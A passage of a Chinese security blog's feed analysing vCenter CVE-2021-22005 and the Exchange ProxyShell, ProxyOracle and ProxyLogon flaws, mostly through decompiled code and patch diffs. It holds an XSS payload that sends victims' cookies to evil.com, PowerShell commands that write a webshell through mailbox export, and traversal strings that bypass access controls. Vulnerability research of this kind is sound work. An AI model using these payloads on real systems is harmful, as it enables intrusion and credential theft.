src="/img/vcenterldfxb_o.png"></p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>由于Tomcat会将<code>/..;/</code>视作<code>/../</code>，可以利用该特性绕过vCenter某些版本的rhttpproxy的访问限制，也可以用来绕过某些WAF的简单规则。</p><ul><li><code>/analytics/cloudhealth/sdk/..;/..;/ph/api/xxx</code></li></ul><p>漏洞利用还有如下路径可供参考，但我没有仔细测试各个版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;sdk</span><br><span class="line">&#x2F;analytics&#x2F;ceip&#x2F;api&#x2F;state</span><br><span class="line">&#x2F;analytics&#x2F;healthstatus</span><br><span class="line">&#x2F;analytics&#x2F;resourcebundle</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;hyper&#x2F;send</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph&#x2F;api&#x2F;level</span><br><span class="line">&#x2F;analytics&#x2F;telemetry&#x2F;ph-stg&#x2F;api&#x2F;level</span><br></pre></td></tr></table></figure><p>对<code>/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/</code>下的WebShell也需要利用路径穿越访问，用得最多的是<code>/idm/..;/shell.jsp</code>，还有如下访问路径可供参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sso-adminserver&#x2F;idp</span><br><span class="line">&#x2F;sso-adminserver&#x2F;sdk</span><br><span class="line">&#x2F;sts&#x2F;STSService</span><br><span class="line">&#x2F;websso</span><br><span class="line">&#x2F;lookupservice</span><br><span class="line">&#x2F;openidconnect</span><br><span class="line">&#x2F;afd</span><br><span class="line">&#x2F;lookup</span><br><span class="line">&#x2F;vmdir</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">VMSA-2021-0020.1</a></p><p><a href="https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/">VMware CVE-2021-22005 Technical &amp; Impact analysis</a></p><p><a href="https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee">Quick note of vCenter RCE (CVE-2021–22005)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-22005&quot;&gt;&lt;a href=&quot;#CVE-2021-22005&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-22005&quot;&gt;&lt;/a&gt;CVE-2021-22005&lt;/h2&gt;&lt;p&gt;Analytics服务相关端点存在目录穿越写</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ESXI" scheme="https://hosch3n.github.io/tags/ESXI/"/>
    
    <category term="VCSA" scheme="https://hosch3n.github.io/tags/VCSA/"/>
    
    <category term="CVE-2021-22005" scheme="https://hosch3n.github.io/tags/CVE-2021-22005/"/>
    
    <category term="CVE-2021-22006" scheme="https://hosch3n.github.io/tags/CVE-2021-22006/"/>
    
    <category term="CVE-2021-22017" scheme="https://hosch3n.github.io/tags/CVE-2021-22017/"/>
    
  </entry>
  
  <entry>
    <title>ProxyShell漏洞分析</title>
    <link href="https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-08-24T04:11:41.000Z</published>
    <updated>2022-05-11T08:29:53.598Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="CVE-2021-34473-amp-CVE-2021-34523"><a href="#CVE-2021-34473-amp-CVE-2021-34523" class="headerlink" title="CVE-2021-34473 &amp; CVE-2021-34523"></a>CVE-2021-34473 &amp; CVE-2021-34523</h2><ul><li>Exchange Server 2013 &lt; Apr21SU</li><li>Exchange Server 2016 &lt; Apr21SU &lt; CU21</li><li>Exchange Server 2019 &lt; Apr21SU &lt; CU10</li></ul><h2 id="CVE-2021-31207"><a href="#CVE-2021-31207" class="headerlink" title="CVE-2021-31207"></a>CVE-2021-31207</h2><ul><li>Exchange Server 2013 &lt; May21SU</li><li>Exchange Server 2016 &lt; May21SU &lt; CU21</li><li>Exchange Server 2019 &lt; May21SU &lt; CU10</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="CVE-2021-34473"><a href="#CVE-2021-34473" class="headerlink" title="CVE-2021-34473"></a>CVE-2021-34473</h3><blockquote><p>The specific flaw exists within the Autodiscover service. The issue results from the lack of proper validation of URI prior to accessing resources. An attacker can leverage this in conjunction with other vulnerabilities to execute arbitrary code in the context of SYSTEM.</p></blockquote><p>ZDI通告说Autodiscover服务没有验证好URL，结合其它漏洞可以SYSTEM身份任意代码执行。看到在CAS中也继承自<code>ProxyRequestHandler</code>类，且会由<code>SelectHandlerForUnauthenticatedRequest</code>方法调用：</p><p><img src="/img/proxyshell_a.png"></p><p><img src="/img/proxyshell_b.png"></p><p>与CVE-2021-26855很相似，猜测CAS的<code>/autodiscover</code>接口存在SSRF。之前ProxyLogon漏洞分析中，我们梳理了几个关键的方法调用栈，知道可以利用<code>EcpProxyRequestHandler</code>类<code>GetClientUrlForProxy</code>方法调用的<code>UriBuilder</code>类特性造成SSRF。而<code>AutodiscoverProxyRequestHandler</code>类的父类<code>EwsAutodiscoverProxyRequestHandler</code>也实现了<code>GetClientUrlForProxy</code>方法：</p><p><img src="/img/proxyshell_c.png"></p><p><code>RemoveExplicitLogonFromUrlAbsoluteUri</code>方法用于剔除<code>absoluteUri</code>中的<code>this.explicitLogonAddress</code>：</p><p><img src="/img/proxyshell_d.png"></p><p>所以也许能够构造一个满足所有前置判断的URL，让它在经过剔除后变成其它敏感路径？首先跟进<code>this.isExplicitLogonRequest</code>属性，看到满足if的条件时会置为true，并将<code>text</code>变量赋值给会被剔除的<code>this.explicitLogonAddress</code>属性：</p><p><img src="/img/proxyshell_e.png"></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">TryGetNormalizedExplicitLogonAddress</span>(<span class="params"><span class="keyword">string</span> explicitLogonAddressout <span class="keyword">string</span> normalizedAddress</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">normalizedAddress = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">string</span>.IsNullOrEmpty(explicitLogonAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">normalizedAddress = explicitLogonAddress.Replace(<span class="string">&quot;...&quot;</span>, <span class="string">&quot;.@&quot;</span>).Replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;@&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TryGetNormalizedExplicitLogonAddress</code>和<code>IsValidSmtpAddress</code>传入合法邮箱格式就能满足。经过<code>RequestPathParser.IsAutodiscoverV2PreviewRequest</code>的判断后，<code>text</code>变量就会从GPCS（GET|POST|Cookie|Server）中取<code>Email</code>参数的值，继续跟进：</p><p><img src="/img/proxyshell_f.png"></p><p>存在指定路径<code>/autodiscover.json</code>就可以满足判断，至此想要被剔除的部分就可控了。之后的流程就跟ProxyLogon类似，会由CAS向后端发起经过Kerberos认证的请求：</p><p><img src="/img/proxyshell_g.png"></p><h3 id="CVE-2021-34523"><a href="#CVE-2021-34523" class="headerlink" title="CVE-2021-34523"></a>CVE-2021-34523</h3><p>在ProxyLogon漏洞分析中，我们已经知道<code>ShouldCopyHeaderToServerRequest</code>方法会过滤一些自定义请求头，其中就包括用于校验用户身份的<code>X-CommonAccessToken</code>。</p><p>在调用<code>BackendRehydrationModule</code>校验身份前，会先由<code>RemotePowershellBackendCmdletProxyModule</code>的<code>OnAuthenticateRequest</code>方法对<code>commonAccessToken</code>进行判断和处理：</p><p><img src="/img/proxyshell_h.png"></p><p>当不存在<code>X-CommonAccessToken</code>头时会进一步调用<code>CommonAccessTokenFromUrl</code>方法（屏幕不够大没截到，就是上图第二个断点那里）：</p><p><img src="/img/proxyshell_i.png"></p><p>可见<code>X-CommonAccessToken</code>头可由<code>X-Rps-CAT</code>参数替代且不在过滤范围内，当能获取/构造所需的数据时，就可以管理员身份访问受限的后端接口。史辛泽师傅分析了<code>Microsoft.Exchange.Net</code>中<code>Authorization</code>与<code>WindowsAccessToken</code>的相关代码，由Python实现了通过用户名与SID生成Token的函数（详见参考链接）。</p><p><img src="/img/proxyshell_j.png"></p><p>将ProxyLogon利用流程123步套用在CVE-2021-34473上，获取SID后本地生成<code>CommonAccessToken</code>，实现以管理员身份访问后端接口：</p><p><img src="/img/proxyshell_k.png"></p><h3 id="CVE-2021-31207-1"><a href="#CVE-2021-31207-1" class="headerlink" title="CVE-2021-31207"></a>CVE-2021-31207</h3><p><code>Microsoft.Exchange.Management.Migration</code>中有一处补丁变动：</p><p><img src="/img/proxyshell_l.png"></p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> <span class="keyword">string</span>[] AllowedPSTFileExtensions = <span class="keyword">new</span> <span class="keyword">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;.pst&quot;</span>,</span><br><span class="line"><span class="string">&quot;.eml&quot;</span>,</span><br><span class="line"><span class="string">&quot;.ost&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看起来是限制了从邮箱导出时的文件后缀名，搜索官方文档基本确定对应<a href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest?view=exchange-ps"><code>New-MailboxExportRequest</code></a>这个cmdlet，用于将邮箱内容导出为<code>pst</code>文件。</p><p><a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd">PST编码算法和转换表</a>是一套字节置换规则。转换表看似是一张表，其实是以每256个字节为分隔的三张表。导出邮件进行编码时，由相应字节（0x00-0xff）对应到数组表中偏移（0-255），将字节替换为表中偏移对应的值。</p><p>想要导出时内容为“原始数据”而非PST编码时，可以根据第一张表（<code>mpbbCrypt</code>）的字节置换规则，查询“原始数据”的字节在表中对应值的偏移，逆推得到导出前要构造的邮件内容。但微软本身也要解码PST，所以不用这么麻烦去逆推，因为第三张表（<code>mpbbCrypt + 512</code>）其实就是这个逆推的转换表。只不过我们此时变成了用解码表规则编码，这样Exchange在导出邮件对数据进行编码时，实际就变成了PST解码（妙啊，有点异或那味）</p><p>对于写WebShell而言，接下来可以通过SMTP发送邮件或是EWS接口操作某个账户邮箱，将构造好的Payload作为附件引入目标邮箱。随后基于WinRM协议与<code>/powershell</code>接口通信，赋予<code>administrator</code>用户邮箱导出权限，并利用UNC路径将目标邮件导出至Web服务目录：</p><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Import Export&quot;</span> <span class="literal">-User</span> <span class="string">&quot;administrator&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">New-MailboxExportRequest</span> <span class="literal">-Mailbox</span> SomeUser <span class="literal">-IncludeFolders</span> <span class="string">&quot;#Inbox#&quot;</span> <span class="literal">-FilePath</span> \\<span class="number">127.0</span>.<span class="number">0.1</span>\c<span class="variable">$</span>\somepath\api.aspx</span><br></pre></td></tr></table></figure><p>除了写WebShell，也可以考虑利用其它写文件GetShell的方式，毕竟现在不像27065一样有长度和格式限制。也不要局限于写文件上，<a href="https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps">ExchangePowerShell</a>还有相当多的cmdlet可用:D</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-21-821/">(Pwn2Own) Microsoft Exchange Server Autodiscover Server Side Request Forgery Authentication Bypass Vulnerability</a></p><p><a href="https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1">Reproducing The ProxyShell Pwn2Own Exploit</a></p><p><a href="https://blog.riskivy.com/exchange-proxyshell%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%e5%8f%8a%e5%88%86%e6%9e%90/">Exchange ProxyShell漏洞复现及分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;h2 id=&quot;CVE-2021-34473-amp-CVE-2021-34523&quot;&gt;&lt;a href=&quot;#CVE-2021-344</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Exchange" scheme="https://hosch3n.github.io/tags/Exchange/"/>
    
    <category term="SSRF" scheme="https://hosch3n.github.io/tags/SSRF/"/>
    
    <category term="CVE-2021-34473" scheme="https://hosch3n.github.io/tags/CVE-2021-34473/"/>
    
    <category term="CVE-2021-34523" scheme="https://hosch3n.github.io/tags/CVE-2021-34523/"/>
    
    <category term="CVE-2021-31207" scheme="https://hosch3n.github.io/tags/CVE-2021-31207/"/>
    
  </entry>
  
  <entry>
    <title>ProxyOracle漏洞分析</title>
    <link href="https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-08-23T04:11:33.000Z</published>
    <updated>2022-05-11T08:30:31.932Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="CVE-2021-31195"><a href="#CVE-2021-31195" class="headerlink" title="CVE-2021-31195"></a>CVE-2021-31195</h2><ul><li>Exchange Server 2013 &lt; May21SU</li><li>Exchange Server 2016 &lt; May21SU &lt; CU21</li><li>Exchange Server 2019 &lt; May21SU &lt; CU10</li></ul><h2 id="CVE-2021-31196"><a href="#CVE-2021-31196" class="headerlink" title="CVE-2021-31196"></a>CVE-2021-31196</h2><ul><li>Exchange Server 2013 &lt; Jul21SU</li><li>Exchange Server 2016 &lt; Jul21SU</li><li>Exchange Server 2019 &lt; Jul21SU</li></ul><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>补丁层面的代码分析就不细说了，可以参考上一篇的ProxyLogon漏洞分析。</p><p>CVE-2021-31195是一个1-Click的XSS，但是exchange的cookie各个字段基本都有HttpOnly，没法直接JS获取。还记得上一篇中说到的吗：</p><blockquote><p>小结一下，Cookie的<code>X-BEResource</code>值可以控制CAS请求的Host，结合UriBuilder类特性可以构造出可控的完整URL，因为采用Kerberos认证所以不能向任意站点发起请求</p></blockquote><p>除了<code>X-BEResource</code>字段，还有<code>X-AnonResource-Backend; X-AnonResource</code>这一组字段可以造成SSRF，而且这个不存在kerb认证，可以向任意站点发起HTTPS请求：</p><p><img src="/img/proxyoracle_a.png"></p><p>本质上是让CAS成为一个反代，将我们指定的站点视为后端，转发HTTPS请求。利用这一点，用XSS执行JS给受害者加上一组存在SSRF的Cookie，并向SSRF漏洞入口发起请求，CAS会将带有完整Cookie的HTTPS请求转发到指定站点，实现绕过HttpOnly窃取Cookies。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//ews.lab/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=&#125;&#125;&#125;;document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,&#123;credentials:`include`&#125;);//</span></span><br></pre></td></tr></table></figure><p><img src="/img/proxyoracle_b.png"></p><p>获取到的Cookie中cadataKey、cadataIV、cadataSig是被RSA加密过的字段，cadata字段是用AES-CBC加密的<code>&quot;Basic &quot; + ToBase64String(UserName + &quot;:&quot; + Password)</code>。在AES出现填充错误时，重定向的URL包含<code>reason=0</code>参数；如果是填充正确但业务逻辑出错，重定向的URL包含<code>reason=2</code>参数。</p><p>这样就达成了PaddingOracle攻击的前置条件，不熟悉的同学请参考附加篇PaddingOracle攻击原理。</p><p>但是因为IV被RSA加密，属于上文中既不可读也不可见的情况，我们无法通过PaddingOracle解密出cadata密文的第一块（16个字符），但好在拼接了<code>Basic </code>字符串且C#的编码为UTF-16-LE（每个ASCII字符对应两个编码），所以前6*2=12个字节会是固定的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;Basic &quot;</span>.encode(<span class="string">&quot;utf-16-le&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;B\x00a\x00s\x00i\x00c\x00 \x00&#x27;</span></span><br></pre></td></tr></table></figure><p>那么第一块中还有16-12=4个字节无法确认，不过AES-CBC加密的其实是Base64编码（每4个编码对应3个ASCII字符），我们最终只会损失(4/2)*(3/4)=1.5个明文ASCII字符（要向上取整，损失两个）。而这前两个ASCII字符，在窃取到的Cookie中<code>logondata=acc=0&amp;lgn=test.com\administrator;</code>已经可以读到了。</p><p>接下来就是跑PaddingOracle了，不想太有判头不放完整EXP了，理解原理后可以很快写出来。</p><p><img src="/img/proxyoracle_c.png"></p><p><em>下一篇我们将一起讨论ProxyShell～</em></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html">A New Attack Surface on MS Exchange Part 2 - ProxyOracle!</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;h2 id=&quot;CVE-2021-31195&quot;&gt;&lt;a href=&quot;#CVE-2021-31195&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="密码学" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="Exchange" scheme="https://hosch3n.github.io/tags/Exchange/"/>
    
    <category term="XSS" scheme="https://hosch3n.github.io/tags/XSS/"/>
    
    <category term="PaddingOracle" scheme="https://hosch3n.github.io/tags/PaddingOracle/"/>
    
    <category term="CVE-2021-31195" scheme="https://hosch3n.github.io/tags/CVE-2021-31195/"/>
    
    <category term="CVE-2021-31196" scheme="https://hosch3n.github.io/tags/CVE-2021-31196/"/>
    
  </entry>
  
  <entry>
    <title>ProxyLogon漏洞分析</title>
    <link href="https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-08-22T01:40:59.000Z</published>
    <updated>2022-05-11T08:30:45.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="组件架构"><a href="#组件架构" class="headerlink" title="组件架构"></a>组件架构</h2><p>Exchange不同版本的组件架构并不相同，但总体上可以将其分为核心的邮箱服务器角色（Mailbox Role）和可选的边缘传输角色（Edge Transport Role）。</p><ul><li>Exchange作为边缘传输角色时部署在内外网交界处，充当邮件安全网关</li></ul><p><img src="/img/proxylogon_a.png"></p><p>Exchange作为邮箱服务器角色时分为客户端访问服务（Client Access Services）和后端服务（Backend Services）部分，CAS负责校验用户身份并将请求反代至具体的后端服务。</p><p><img src="/img/proxylogon_b.png"></p><p>CAS对应IIS中的<code>Default Web Site</code>监听在80和443端口，BS对应IIS中的<code>Exchange Back End</code>监听在81和444端口。</p><p><img src="/img/proxylogon_c.png"></p><p>出于解耦和兼容考虑，各个功能被封装为多个模块，有如下常用功能（缩写名对应URL访问路径）：</p><ul><li>OWA（Outlook Web App）</li><li>ECP（Exchange Control Panel）</li><li>EWS（Exchange Web Service）</li><li>Autodiscover</li><li>MAPI（Messaging Application Programming Interface）</li><li>EAS（Exchange ActiveSync）</li><li>OAB（Offline Address Books）</li><li>PowerShell</li></ul><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Exchange Server 2013 &lt; Mar21SU</li><li>Exchange Server 2016 &lt; Mar21SU &lt; CU20</li><li>Exchange Server 2019 &lt; Mar21SU &lt; CU9</li></ul><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>根据微软官方通告可以知道ProxyLogon漏洞的补丁编号为KB5000871，也可以看到此补丁的前置补丁编号为KB4602269，将两个msp补丁文件下载下来并通过7z解压得到多个dll。</p><ul><li>也可以在<a href="https://www.catalog.update.microsoft.com/home.aspx">Microsoft Update Catalog</a>中搜索补丁编号下载cab文件并解压</li></ul><p>下载<a href="https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip">dnSpy</a>用于反编译和调试C#的dll文件。由于我们并不是要调试二进制洞，为了避免干扰需要取消勾选<code>View-&gt;Options-&gt;Decompiler-&gt;ILSpy-&gt;Show tokens, RVAs and file offsets</code>。将解压出的dll拖入dnSpy并选中高亮，通过<code>File-&gt;Export to Project</code>就可以得到反编译后的工程文件。</p><p>拿到补丁前后两份反编译的源码后，在低版本源码文件夹建立git目录，再将高版本源码文件覆盖过来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> kb4602269</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&#x27;init&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Alias cp=&#x27;cp -i&#x27;</span></span><br><span class="line">/usr/bin/cp -r ../kb5000871/* ./</span><br></pre></td></tr></table></figure><p>这样就能在任意支持git管理的IDE中方便地进行补丁对比了（比如VSCode），小缺点就是有的整个文件就一点无关紧要的字符变化而已（之前对比vCenter时也是），而我们显然只是想关注一些函数和流程的变动，所以之后也许可以结合页面相似度之类的算法再筛一遍，现阶段可以用批量替换的办法凑合。</p><h2 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h2><p><code>Microsoft.Exchange.FrontEndHttpProxy</code>未有效校验Cookie中用户可控的<code>X-BEResource</code>值，后续处理中结合.NET的<code>UriBuilder</code>类特性造成SSRF。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote><p>CVE-2021-26855 is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.</p></blockquote><p>微软通告说这是一个以<strong>Exchange服务器</strong>作为身份认证的SSRF漏洞，说明肯定涉及到了NTLM/Kerberos认证，再结合Volexity捕获到的相关访问路径来看，定位到<code>Microsoft.Exchange.FrontEndHttpProxy</code>相关的代码变动：</p><p><img src="/img/proxylogon_d.png"></p><p><code>ProxyRequestHandler</code>类是CAS反代过程中，负责处理用户请求与后端响应的一个承前启后的组件。因为函数调用关系比较复杂，为了避免看上去一团乱麻，所以在具体分析某个方法作用前，先从广度上列出从收到用户请求开始几个主线的方法调用栈。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Microsoft.Exchange.FrontEndHttpProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ProxyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    public void Init(HttpApplication application)</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnPostAuthorizeRequest</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function">            <span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">OnPostAuthorizeInternal</span>(<span class="params">HttpApplication httpApplication</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                <span class="keyword">private</span> IHttpHandler <span class="title">SelectHandlerForUnauthenticatedRequest</span>(<span class="params">HttpContext httpContext</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">                HttpContext context</span> = httpApplication.Context;</span><br><span class="line">                context.RemapHandler(httpHandler);</span><br></pre></td></tr></table></figure><p><img src="/img/proxylogon_e.png"></p><p>当请求路径为<code>/ecp/</code>时，会通过<code>IsResourceRequest</code>方法判断文件后缀名：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Microsoft.Exchange.FrontEndHttpProxy</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">BEResourceRequestHandler</span> : <span class="title">ProxyRequestHandler</span></span><br><span class="line">    internal static bool CanHandle(HttpRequest httpRequest)</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">string</span> <span class="title">GetBEResouceCookie</span>(<span class="params">HttpRequest httpRequest</span>)</span></span><br><span class="line"><span class="function">        <span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">IsResourceRequest</span>(<span class="params"><span class="keyword">string</span> localPath</span>)</span></span><br></pre></td></tr></table></figure><p><img src="/img/proxylogon_f.png"></p><p><img src="/img/proxylogon_g.png"></p><p>通过判断后由<code>BeginProcessRequest</code>方法继续处理后续流程：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> IAsyncResult <span class="title">BeginProcessRequest</span>(<span class="params">HttpContext context, AsyncCallback cb, <span class="keyword">object</span> extraData</span>)</span></span><br><span class="line"><span class="function">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InternalBeginCalculateTargetBackEnd</span>(<span class="params"><span class="keyword">out</span> AnchorMailbox anchorMailbox</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="keyword">protected</span> <span class="keyword">override</span> AnchorMailbox <span class="title">ResolveAnchorMailbox</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="keyword">public</span> <span class="title">ServerInfoAnchorMailbox</span>(<span class="params">BackEndServer backendServer, IRequestContext requestContext</span>)</span></span><br><span class="line"><span class="function">                <span class="keyword">public</span> <span class="keyword">static</span> BackEndServer <span 